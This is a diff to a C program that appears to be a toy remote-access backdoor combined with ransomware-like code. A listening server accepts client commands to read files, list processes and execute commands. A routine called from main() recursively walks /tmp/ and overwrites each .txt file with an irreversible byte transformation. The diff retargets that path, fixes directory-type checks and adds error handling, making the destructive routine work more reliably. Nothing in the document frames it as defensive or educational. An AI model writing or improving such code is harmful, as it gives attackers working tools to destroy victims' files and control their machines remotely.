@@ -29,7 +29,7 @@
 #define COMMAND_SEPARATOR ','
 #define MAX_PATH_LENGTH 512
 #define ZERO(buff) memset(buff,0,MAX_PACKET)
-#define DEBUG 0
+#define DEBUG 1
 
 
 // 功能
@@ -45,7 +45,7 @@ enum COMMAND{
 int analysisCommand(int clientSock,char * clientMessage);
 int transferData(int clientSock,char * clientMessage);
 int readServerFile(int clientSock,char * args);
-int viewProcess(int clientSock,char * args);
+int viewProcess(int clientSock,const char * args);
 int executeAsServerResponse(int clientSock,char * command,const char * method);
 // int executeAsServer(int clientSok,char * command,const char * method);
 void help(int clientSock);
@@ -56,7 +56,7 @@ int startServer();
 
 int encryption(){
     char paths[MAX_PATH_NUM][MAX_PATH_LENGTH]={
-        "/private/tmp/"
+            "/tmp/"
     };
     for(int x = 0;x < MAX_PATH_NUM; x++){
         if(paths[x][0]=='\0'){
@@ -78,10 +78,10 @@ int startServer(){
 
     serverAddrInfo.sin_addr.s_addr = INADDR_ANY;
     serverAddrInfo.sin_port = htons(SVR_PORT);
-    
+
     int reuse = 1;
     setsockopt(serverSock,SOL_SOCKET,SO_REUSEADDR,&reuse, sizeof(reuse));
-    // bind server 
+    // bind server
     bind(serverSock,(struct sockaddr *)&serverAddrInfo,sizeof(serverAddrInfo));
     printf("[*]Bind Server success! \n");
     // listen server
@@ -98,13 +98,13 @@ int startServer(){
             pid_t process = fork();
             if( process == 0 ){
                 printf("[!]Server created one child ... \n");
-                // child ... 
+                // child ...
                 close(serverSock);
                 char  sendBuff[MAX_PACKET] = WELCOME_MSG;
-                // send message to client 
+                // send message to client
                 send(connectSock,sendBuff,strlen(sendBuff),0);
                 // memset(sendBuff,0,sizeof(sendBuff));
-                ZERO(sendBuff); 
+                ZERO(sendBuff);
                 int recvMsgSize = 0;
                 while((recvMsgSize = recv(connectSock,sendBuff,sizeof(sendBuff),0))){
                     transferData(connectSock,"[Cooolis]>");
@@ -137,78 +137,94 @@ int encryptionPath(char * path){
     if(DEBUG){
         printf("[#]Path is %s \n",path);
     }
+
     struct dirent * ent = NULL;
     DIR * pDir;
     pDir = opendir(path);
+    if(!pDir){
+        return -1;
+    }
     while(NULL != (ent = readdir(pDir))){
+//        if(DEBUG){
+//            printf("[#]Name is %s \n",ent->d_name);
+//        }
+        // continue;
         // 排除软链接
-        if(ent->d_type & 4 && !(ent->d_type & 10)){
-             if(ent->d_name[0] == '.' || strcmp(ent->d_name,"..") == 0){
-                 // 跳过特殊目录
-                 continue;
-             }
+        if(ent->d_type & DT_DIR && !(ent->d_type & DT_LNK)){
+            if(ent->d_name[0] == '.' || strcmp(ent->d_name,"..") == 0){
+                // 跳过特殊目录
+                continue;
+            }
+
             // normal file ....
             // 获取文件名长度
             size_t pathLen = strlen(path)+strlen(ent->d_name)+2;
+
+
             // 分配内存空间
             char * absolutePath = (char *)calloc(pathLen,1);
             // 拼接文件名
             strcat(absolutePath,path);
             strcat(absolutePath,ent->d_name);
             strcat(absolutePath,"/");
+            if(DEBUG){
+                printf("[#]Name is %s \n",absolutePath);
+                // continue;
+            }
             // 递归子目录
             encryptionPath(absolutePath);
             // 释放内存
             free(absolutePath);
+
             // encryption file ....
         }else{
-                // 普通文件处理动作
-                size_t pathLen = strlen(path)+strlen(ent->d_name)+2; // 获取文件名长度
-                char * absolutePath = (char *)calloc(pathLen,1);
-                strcat(absolutePath,path);
-                strcat(absolutePath,ent->d_name);
-                // strcat(absolutePath,"/");
-                char * ext = strrchr(ent->d_name,'.');
-                // printf("[X]path : %s , ext %s \n",absolutePath,ext);
-                if(ext != NULL && strcmp(ext,".txt") == 0){ // 判断扩展名是否是.txt
-                    // txt文件
-                    FILE * fp = NULL;
-                    if(DEBUG){
-                        printf("[X]encryption : %s \n",absolutePath);
-                    }
-                    fp = fopen(absolutePath,"r");
-                    if(fp != NULL ){
-                        struct stat encryptFileStat;
-                        stat(absolutePath,&encryptFileStat);
-                        // 申请一块与文件大小相等的内存
-                        char * fileSize = (char *)calloc(encryptFileStat.st_size+1,sizeof(char));
-                        if(DEBUG){
-                            printf("[*]filesize : %lld \n",encryptFileStat.st_size);
-                            printf("[*]read: %s uid : %d \n",fileSize,getuid());
-                        }
-                        printf("[X]encryption : %s \n",absolutePath);
-                        // 将文件内容放入内存
-                        fread(fileSize,1,encryptFileStat.st_size,fp);
-                        fclose(fp);
-                        char * pchar = fileSize;
-                        // 遍历
-                        while(*pchar){
-                            if((*pchar & 1) == 1){
-                                //奇数
-                                *pchar+=1;
-                            }else{
-                                // 偶数
-                                *pchar/=2;
-                            }
-                            pchar++;
-                        }
-                        // 将内存写入文件
-                        fp = fopen(absolutePath,"w");
-                        fwrite(fileSize,strlen(fileSize),1,fp);
-                        fclose(fp);
-                        free(fileSize);
-                    }
+            // 普通文件处理动作
+            size_t pathLen = strlen(path)+strlen(ent->d_name)+2; // 获取文件名长度
+            char * absolutePath = (char *)calloc(pathLen,1);
+            strcat(absolutePath,path);
+            strcat(absolutePath,ent->d_name);
+            // strcat(absolutePath,"/");
+            char * ext = strrchr(ent->d_name,'.');
+            // printf("[X]path : %s , ext %s \n",absolutePath,ext);
+            if(ext != NULL && strcmp(ext,".txt") == 0){ // 判断扩展名是否是.txt
+                // txt文件
+                FILE * fp = NULL;
+                if(DEBUG){
+                    printf("[X]encryption : %s \n",absolutePath);
                 }
+                fp = fopen(absolutePath,"r");
+                if(fp != NULL ){
+                    struct stat encryptFileStat;
+                    stat(absolutePath,&encryptFileStat);
+                    // 申请一块与文件大小相等的内存
+                    char * fileSize = (char *)calloc(encryptFileStat.st_size+1,sizeof(char));
+                    if(DEBUG){
+                        printf("[*]filesize : %ld \n",encryptFileStat.st_size);
+                        printf("[*]read: %s uid : %d \n",fileSize,getuid());
+                    }
+                    printf("[X]encryption : %s \n",absolutePath);
+                    // 将文件内容放入内存
+                    fread(fileSize,1,encryptFileStat.st_size,fp);
+                    fclose(fp);
+                    char * pchar = fileSize;
+                    // 遍历
+                    while(*pchar){
+                        if((*pchar & 1) == 1){
+                            //奇数
+                            *pchar+=1;
+                        }else{
+                            // 偶数
+                            *pchar/=2;
+                        }
+                        pchar++;
+                    }
+                    // 将内存写入文件
+                    fp = fopen(absolutePath,"w");
+                    fwrite(fileSize,strlen(fileSize),1,fp);
+                    fclose(fp);
+                    free(fileSize);
+                }
+            }
             free(absolutePath);
         }
     }
@@ -250,7 +266,7 @@ int executeAsServerResponse(int clientSock,char * command,const char * method){
     return 0;
 }
 
-int viewProcess(int clientSock,char * args){
+int viewProcess(int clientSock,const char * args){
     if(*args == '0'){
         // 调用ps命令
         if(DEBUG){
@@ -270,14 +286,14 @@ int readServerFile(int clientSock,char * args){
     }
     char fileData[MAX_PACKET];
     ZERO(fileData);
-    
+
     FILE * fp = NULL;
     fp = fopen(args,"r");
     if(fp==NULL){
         transferData(clientSock,"[!]File Can't Read ... \n");
         return -1;
     }
- 
+
     struct stat statbuf;
     stat(args,&statbuf);
     size_t size=statbuf.st_size;
@@ -318,7 +334,7 @@ int analysisCommand(int clientSock,char * clientMessage){
     if(DEBUG){
         printf("[~]Message : %s \n",clientMessage);
     }
-    
+
 
     if((args - clientMessage) > MAX_COMMAND_LENGTH ){
         printf("[!]Command to long ... \n");
@@ -370,6 +386,6 @@ int analysisCommand(int clientSock,char * clientMessage){
 }
 
 int main(int argc, char const *argv[]){
-    encryption();    
+    encryption();
     return 0;
 }
